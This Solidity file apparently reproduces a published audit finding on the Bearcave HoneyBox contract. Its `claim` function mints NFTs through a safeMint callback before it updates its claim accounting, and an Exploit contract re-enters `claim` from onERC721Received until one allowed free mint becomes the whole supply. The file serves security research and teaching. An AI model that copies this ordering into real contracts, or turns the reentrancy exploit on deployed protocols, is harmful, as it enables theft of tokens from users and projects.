// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Bearcave finding 20530 (C-02):
// "Reentrancy allows any user allowed even one free `HoneyJar` mint to mint the
//  max supply for himself for free".
//
// Real audited source (the vulnerable body of `claim` is reproduced VERBATIM
// from the finding's embedded snippet, the vulnerable line is marked @>):
//   protocol Bearcave (0xHoneyJar / bear-cave)
//   contract HoneyBox.sol  (claim method)
//   report   github.com/solodit/solodit_content .../Pashov/2023-03-01-BearCave.md
//
// Root cause: `claim` mints the HoneyJar NFTs BEFORE it updates the `claimed`
// accounting and BEFORE it records the claim in the Gatekeeper. Minting uses
// `honeyJar.batchMint` -> `_safeMint`, which makes an UNSAFE external call to
// the mint recipient (`onERC721Received`). That call re-enters `claim` while
// `claimed[bundleId_]` is still stale and the Gatekeeper has not recorded
// anything, so `_getNumClaimable` keeps returning the full entitlement and the
// mint check (`_canMintHoneyJar`) only bounds against the live minted supply.
// A user entitled to a single free HoneyJar re-enters until `mintConfig.
// maxHoneyJar` is reached, minting the ENTIRE remaining supply for free.
//
// The vulnerable ordering in `claim` is byte-for-byte the on-chain source
// (interaction `_mintHoneyJarForBear(...)` executed before the `claimed +=`
// effect and the `gatekeeper.addClaimed(...)` effect). Non-vulnerable
// dependencies (`HoneyJar` ERC721 with `safeMint` callback, `Gatekeeper`
// claim accounting, `_getNumClaimable`, `_canMintHoneyJar`) are faithful
// minimal doubles: `_safeMint` updates the minted supply and balance BEFORE
// invoking the recipient callback, exactly like OpenZeppelin/ERC721A.
// ─────────────────────────────────────────────────────────────────────────────

interface IERC721Receiver {
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4);
}

/// @dev Faithful minimal ERC721 double for the HoneyJar NFT. `batchMint` mints
///      `amount_` tokens via `_safeMint`, which — like OZ/ERC721A — updates the
///      minted supply and owner/balance state and THEN makes the unsafe external
///      call to the recipient's `onERC721Received`. This is the reentrancy hook
///      the finding describes ("safeMint ... does an unsafe external call to the
///      mint recipient").
contract HoneyJar {
    string public name = "HoneyJar";
    string public symbol = "HONEYJAR";

    uint256 internal _minted; // total minted supply (ERC721A `_currentIndex`)
    mapping(uint256 => address) public ownerOf;
    mapping(address => uint256) public balanceOf;

    address public honeyBox; // authorized minter (HoneyBox)

    function setHoneyBox(address honeyBox_) external {
        honeyBox = honeyBox_;
    }

    function totalMinted() external view returns (uint256) {
        return _minted;
    }

    /// @notice Faithful `batchMint` used by HoneyBox: mints `amount_` NFTs to
    ///         `to_`, each via `_safeMint`.
    function batchMint(address to_, uint256 amount_) external returns (uint256 firstId) {
        require(msg.sender == honeyBox, "only honeyBox");
        firstId = _minted;
        for (uint256 i = 0; i < amount_; i++) {
            _safeMint(to_);
        }
    }

    /// @dev ERC721A/OZ-style `_safeMint`: state (supply + balance + owner) is
    ///      updated BEFORE the recipient callback — the unsafe external call.
    function _safeMint(address to_) internal {
        uint256 tokenId = _minted;
        _minted += 1;
        balanceOf[to_] += 1;
        ownerOf[tokenId] = to_;
        if (to_.code.length > 0) {
            require(
                IERC721Receiver(to_).onERC721Received(msg.sender, address(0), tokenId, "") == 0x150b7a02,
                "unsafe recipient"
            );
        }
    }
}

/// @dev Faithful minimal double of the Bearcave Gatekeeper. Tracks per-gate
///      claimed counts and enforces each gate's `maxClaimable`. The finding's
///      second broken invariant: `addClaimed` is called only AFTER the mint, so
///      during reentrancy `claimedForGate` is still stale and the gate cap is
///      not yet enforced.
contract Gatekeeper {
    struct Gate {
        uint32 maxClaimable;
        bool enabled;
    }

    // bundleId => gateId => gate config
    mapping(uint256 => mapping(uint256 => Gate)) public gates;
    // bundleId => gateId => amount already claimed through this gate
    mapping(uint256 => mapping(uint256 => uint32)) public claimedForGate;

    function addGate(uint256 bundleId_, uint32 gateId_, uint32 maxClaimable_) external {
        gates[bundleId_][gateId_] = Gate({maxClaimable: maxClaimable_, enabled: true});
    }

    /// @notice How many the player may still claim through this gate right now.
    function calculateClaimable(uint256 bundleId_, uint32 gateId_, uint32 amount_, bytes32[] calldata /*proof*/ )
        external
        view
        returns (uint32)
    {
        Gate memory g = gates[bundleId_][gateId_];
        if (!g.enabled) return 0;
        uint32 already = claimedForGate[bundleId_][gateId_];
        if (already >= g.maxClaimable) return 0;
        uint32 remaining = g.maxClaimable - already;
        return amount_ < remaining ? amount_ : remaining;
    }

    /// @notice Records a claim. Called by HoneyBox AFTER the mint (too late).
    function addClaimed(uint256 bundleId_, uint32 gateId_, uint32 numClaimed_, bytes32[] calldata /*proof*/ ) external {
        claimedForGate[bundleId_][gateId_] += numClaimed_;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — the body of `claim` is reproduced VERBATIM from the
// audited HoneyBox source (finding's embedded snippet).
// ─────────────────────────────────────────────────────────────────────────────
contract HoneyBox {
    struct MintConfig {
        uint32 maxHoneyJar; // max HoneyJars mintable for a bundle
    }

    HoneyJar public honeyJar;
    Gatekeeper public gatekeeper;
    MintConfig public mintConfig;

    // bundleId => list of minted honeyJar token ids (the "shelf")
    mapping(uint256 => uint256[]) public honeyJarShelf;
    // bundleId => total claimed (the accounting updated AFTER minting)
    mapping(uint256 => uint256) public claimed;

    constructor(HoneyJar honeyJar_, Gatekeeper gatekeeper_, uint32 maxHoneyJar_) {
        honeyJar = honeyJar_;
        gatekeeper = gatekeeper_;
        mintConfig = MintConfig({maxHoneyJar: maxHoneyJar_});
    }

    // ── faithful doubles for the non-vulnerable helpers `claim` calls ──

    /// @dev Determines how many the caller may claim, delegating to the
    ///      Gatekeeper (which is only updated AFTER the mint — see the bug).
    function _getNumClaimable(uint256 bundleId_, uint32 gateId, uint32 amount, bytes32[] calldata proof)
        internal
        view
        returns (uint32)
    {
        return gatekeeper.calculateClaimable(bundleId_, gateId, amount, proof);
    }

    /// @dev Bounds minting against the LIVE minted supply of the bundle. Because
    ///      the minted count grows during `batchMint` (before each callback),
    ///      this only stops the attacker once `maxHoneyJar` is reached — it does
    ///      NOT stop the reentrancy from bypassing per-user `claimed`/gate caps.
    function _canMintHoneyJar(uint256 bundleId_, uint256 amount_) internal view {
        require(honeyJarShelf[bundleId_].length + amount_ <= mintConfig.maxHoneyJar, "too many honeyJars");
    }

    /// @dev Mints `numClaim` HoneyJars to `to_`. Delegates to
    ///      `honeyJar.batchMint` -> `_safeMint` (the unsafe external call), then
    ///      records the minted ids on the shelf.
    function _mintHoneyJarForBear(address to_, uint256 bundleId_, uint256 numClaim_) internal {
        uint256 firstId = honeyJar.batchMint(to_, numClaim_);
        for (uint256 i = 0; i < numClaim_; i++) {
            honeyJarShelf[bundleId_].push(firstId + i);
        }
    }

    /// @notice Allows a player to claim free HoneyJar based on eligibility.
    ///         The body below is VERBATIM from the audited HoneyBox `claim`.
    function claim(uint256 bundleId_, uint32 gateId, uint32 amount, bytes32[] calldata proof)
        external
        returns (uint256)
    {
        // numClaims can change between calls, so it is (re)computed here.
        uint32 numClaim = _getNumClaimable(bundleId_, gateId, amount, proof);
        if (numClaim == 0) {
            return 0;
        }

        _canMintHoneyJar(bundleId_, numClaim); // Validating here because numClaims can change

        // If for some reason this fails, GG no honeyJar for you
        _mintHoneyJarForBear(msg.sender, bundleId_, numClaim); // @> VULN: unsafe safeMint external call re-enters `claim` BEFORE the `claimed` / gatekeeper accounting below

        claimed[bundleId_] += numClaim;
        // Can be combined with "claim" call above, but keeping separate to separate view + modification on gatekeeper
        gatekeeper.addClaimed(bundleId_, gateId, numClaim, proof);

        return numClaim;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: an attacker entitled to exactly ONE free HoneyJar re-enters
// `claim` from the `onERC721Received` callback and mints the entire remaining
// supply (`maxHoneyJar`) for free, paying nothing.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit is IERC721Receiver {
    HoneyJar public honeyJar;
    Gatekeeper public gatekeeper;
    HoneyBox public vuln;

    uint256 public constant BUNDLE_ID = 1;
    uint32 public constant GATE_ID = 0;
    uint32 public constant MAX_HONEYJAR = 10; // full HoneyJar supply for the bundle
    uint32 public constant ENTITLEMENT = 1; // attacker is allowed exactly ONE free mint

    uint256 public entitledTo; // what the attacker was actually allowed
    uint256 public minted; // how many HoneyJars the attacker ended up with
    uint256 public profit; // free HoneyJars obtained (== minted, all free)

    bytes32[] internal proof;

    constructor() {
        honeyJar = new HoneyJar(); // child nonce 1 (PROFIT token)
        gatekeeper = new Gatekeeper(); // child nonce 2
        vuln = new HoneyBox(honeyJar, gatekeeper, MAX_HONEYJAR); // child nonce 3 (VULN)

        honeyJar.setHoneyBox(address(vuln));
        // attacker's gate: allowed to claim exactly ENTITLEMENT (1)
        gatekeeper.addGate(BUNDLE_ID, GATE_ID, ENTITLEMENT);
        proof.push(bytes32(uint256(1))); // non-empty proof placeholder
    }

    /// @dev Re-enter `claim` from the mint callback until the whole supply is
    ///      minted. Each re-entry sees stale `claimed` / gatekeeper state, so it
    ///      passes eligibility again despite the attacker only being entitled to
    ///      one HoneyJar.
    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        if (honeyJar.totalMinted() < MAX_HONEYJAR) {
            vuln.claim(BUNDLE_ID, GATE_ID, ENTITLEMENT, proof);
        }
        return 0x150b7a02;
    }

    function run() external {
        entitledTo = ENTITLEMENT;

        // Single top-level claim for the ONE HoneyJar the attacker is entitled to.
        // Reentrancy from the safeMint callback drains the rest for free.
        vuln.claim(BUNDLE_ID, GATE_ID, ENTITLEMENT, proof);

        minted = honeyJar.balanceOf(address(this));
        profit = minted; // every HoneyJar was minted for free

        // harm: attacker entitled to 1 free HoneyJar walked away with the entire
        // maxHoneyJar supply, all for free.
        require(minted == MAX_HONEYJAR, "did not mint full supply");
        require(minted > ENTITLEMENT, "no illicit gain");
    }
}
